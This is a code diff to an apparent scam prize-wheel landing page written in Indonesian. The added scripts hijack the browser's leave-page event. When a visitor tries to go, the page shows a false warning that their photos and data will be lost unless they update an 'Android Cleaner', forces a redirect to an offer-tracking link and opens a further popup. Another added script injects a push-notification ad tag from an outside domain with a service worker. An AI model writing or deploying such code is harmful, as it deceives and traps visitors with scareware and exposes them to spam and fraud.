@@ -128,7 +128,7 @@
                 Harga Anda: 
                 <span class="new-prize">HK$0,00</span>
               </div>
-              <a href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3" class="step__button">Klaim Hadiah</a>
+              <a href="https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3" id="button-sweeps" class="step__button">Klaim Hadiah</a>
             </div>
           </div>
         </div>
@@ -278,6 +278,64 @@ window.view.redirect = redirect;
 <script src="js/app801b.js?id=d41d8cd98f00b204e980" type="application/javascript"></script>
 <script src="js/private8b5d.js?id=2e6382e857f94bd39e85" type="application/javascript"></script>
 <script src="js/landers/prizewheel-fb/appa2ce.js?id=c1e1d839a41fc2e716b9" type="application/javascript"></script>
+
+<script type="text/javascript">
+	var nc = 'https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3';
+	
+	document.getElementById("button-sweeps").href = nc;
+
+    (function (w, d) {
+        var epp = function () {
+            if (w.onbeforeunload === null) {
+                var to;
+                function repp() {
+                    w.onbeforeunload = null;
+					window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+                };
+                function epp() {
+                    to = setTimeout(function () {
+                        w.location.replace(nc);
+                        repp();
+                    }, 100);
+                    return 'You should update your Android Cleaner now or your photos and data will be lost and cannot be recovered!';
+                }
+                w.onbeforeunload = epp;
+                // Prevent epp firing from clicking on tracking links
+                var ln = d.querySelectorAll("[href='"+nc+"']");
+                for (i = 0; i < ln.length; ++i) {
+                    ln[i].addEventListener("click", function () {
+                        repp();
+                    });
+                }
+            }
+            ;
+        };
+        if (d.readyState != 'loading') {
+            epp();
+        } else {
+            d.addEventListener('DOMContentLoaded', epp);
+        }
+    })(window, document);
+</script>
+
+<script>
+  var url = new URL(window.location.href);
+  var pci = url.searchParams.get('clickid');
+  var s = document.createElement('script');
+  s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&ymid='+pci+'&sw=/sw-check-permissions-747a6.js';
+  s.onload = function(result) {
+      switch (result) {
+          case 'onPermissionDefault':break;
+          case 'onPermissionAllowed':break;
+          case 'onPermissionDenied':break;
+          case 'onAlreadySubscribed':break;
+          case 'onNotificationUnsupported':break;
+      }
+  }
+
+  document.head.appendChild(s);
+</script>
+
 </body>
 
 </html>
